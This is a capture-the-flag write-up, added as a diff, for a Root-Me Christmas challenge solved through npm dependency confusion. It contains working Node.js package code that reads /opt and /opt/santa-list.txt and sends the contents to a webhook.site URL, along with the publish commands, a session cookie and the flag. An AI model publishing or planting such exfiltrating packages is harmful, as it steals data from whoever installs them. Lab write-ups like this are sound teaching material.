@@ -179,3 +179,179 @@ def matpow(M, k):
     return R
 ```
 
+## X-Mas Assistant Day 3
+
+### Description of the challenge
+
+```
+Every winter, the elves’ factory relies on a massive statistics system to optimize gift production. Everything was running smoothly… until DevSecOops the elf spilled his eggnog all over his laptop. Disaster: he lost the only access to the production server, which contains the one and only copy of Santa’s List!
+
+From his… let’s say foggy memory, the file should be somewhere inside the /opt/ directory.
+```
+
+A public registry for the challenge has been setup 
+https://registry.challenges.xmas.root-me and we are given a dedicated container (e.g http://dyn-01.xmas.root-me.org:18393/login.html)
+
+### Reconnaissance
+
+We log in the Elf Workshop with any credentials. For example, admin/admin works.
+
+![](/images/xmas2025-day3-page.png)
+
+The page source shows ends points for `/api/profile`, `/login.html`, `/api/package` and `/api/stats`.
+
+```json
+const response = await fetch('/api/profile').catch(() => null);
+      if (!response || !response.ok) {
+        window.location.href = '/login.html';
+        return;
+      }
+...
+const packageResponse = await fetch('/api/package');
+        if (packageResponse.ok) {
+          const packageJson = await packageResponse.json();
+          console.debug('[package] package.json exposed:', packageJson);
+        }
+...
+async function loadStats() {
+      const response = await fetch('/api/stats');
+      const data = await response.json();
+      }
+```
+
+We get our cookie, and use it in curl requests:
+
+```
+curl -i -H "Cookie: connect.sid=s%3AWaSti_8L3jhKkfFIBTABna8ZbiFD-jCg.bf4Wg3h2TAmnD%2FmpYdy5le1QWWJGzk3qltd7sYC0wPU" http://dyn-01.xmas.root-me.org:18393/api/stats
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 110
+ETag: W/"6e-jtqSzrSVZUQhNkS7WOYKTfQyJEU"
+Date: Tue, 09 Dec 2025 18:44:45 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"giftsWrapped":121,"toysMade":148,"lettersRead":208,"efficiency":48,"generatedAt":"2025-12-09T18:19:46.873Z"}
+```
+
+![](/images/xmas2025-day3-cookie.png)
+NB. The cookie value in the image is not the same as in the CURL request.
+
+### Package
+
+With the `/api/package` end point, the response is the JSON for the NPM package:
+
+```json
+{
+  "name": "elf-stats-tinsel-bauble-144",
+  "version": "1.0.0",
+  "main": "index.js",
+  "description": "Package generated automatically every 2 minutes..",
+  "author": "Elf Workshop",
+  "license": "MIT"
+}
+```
+
+![](/images/xmas2025-day3-package.png)
+
+So, the idea is to craft an update of this NPM package and read the `/opt` directory.
+
+
+### Exploit NPM package
+
+Initialize a package directory: `npm init -y`.
+
+In `package.json`, I re-use the same package name, and I make sure to increment the version each time. The rest is the same as the original version, exception the description (for fun).
+
+```json
+{
+  "name": "elf-stats-tinsel-bauble-144",
+  "version": "1.0.4",
+    "main": "index.js",
+    "description" : "super package",
+  "author": "Elf Workshop",
+  "license": "MIT"
+}
+```
+
+In `index.js`, I write a script that read `/opt`:
+
+```javascript
+const fs = require("fs");
+const https = require("https");
+
+const data = fs.readdirSync("/opt").join(",");
+
+https.get("https://webhook.site/MY-ID?data=" + encodeURIComponent(data));
+```
+
+I open https://webhook.site to get my personal id and replace it here.
+So, when my NPM package is executed, the content of `/opt` is posted to my webhook page.
+
+I publish the new npm:
+
+```
+# npm publish --registry https://registry.challenges.xmas.root-me.org/
+npm notice
+npm notice 📦  elf-stats-tinsel-bauble-144@1.0.4
+npm notice Tarball Contents
+npm notice 229B index.js
+npm notice 176B package.json
+npm notice Tarball Details
+npm notice name: elf-stats-tinsel-bauble-144
+npm notice version: 1.0.4
+npm notice filename: elf-stats-tinsel-bauble-144-1.0.4.tgz
+npm notice package size: 458 B
+npm notice unpacked size: 793 B
+npm notice shasum: d12739a238872b8099e8ffc4e9dbaf8ee5cf8951
+npm notice integrity: sha512-yRzBEzVA0Cn2/[...]55l7kXyesRonQ==
+npm notice total files: 4
+npm notice
+npm notice Publishing to https://registry.challenges.xmas.root-me.org/ with tag latest and default access
++ elf-stats-tinsel-bauble-144@1.0.4
+```
+
+It works, I see `/opt` has `santa-list.txt`
+
+![](/images/xmas2025-day3-webhook.png)
+
+### Getting the flag
+
+So, I do the same thing once again, but this time I will read `/opt/santa-list.txt`:
+
+```javascript
+const fs = require("fs");
+const https = require("https");
+
+const content = fs.readFileSync("/opt/santa-list.txt", "utf8");
+
+https.get("https://webhook.site/MY_ID?data=" + encodeURIComponent(content));
+```
+
+Don't forget to modify the version of the NPM package in `package.json`, and then publish the new version.
+
+```
+npm publish --registry https://registry.challenges.xmas.root-me.org/
+npm notice
+npm notice 📦  elf-stats-tinsel-bauble-144@1.0.5
+npm notice Tarball Contents
+npm notice 232B index.js
+npm notice 176B package.json
+npm notice Tarball Details
+npm notice name: elf-stats-tinsel-bauble-144
+npm notice version: 1.0.5
+npm notice filename: elf-stats-tinsel-bauble-144-1.0.5.tgz
+npm notice package size: 448 B
+npm notice unpacked size: 813 B
+npm notice shasum: 0043477c0dfcb2dd2029fa3498fa2d9ef55e6e7a
+npm notice integrity: sha512-ncn0e2GUmPuTo[...]ALiEeXfoVpMTw==
+npm notice total files: 4
+npm notice
+npm notice Publishing to https://registry.challenges.xmas.root-me.org/ with tag latest and default access
++ elf-stats-tinsel-bauble-144@1.0.5
+```
+
+![](/images/xmas2025-day3-webhook.png)
+
+The flag is `RM{_D3p3nd3ncy_C0nfus10n_1s_N0t_4_G4m3_}`
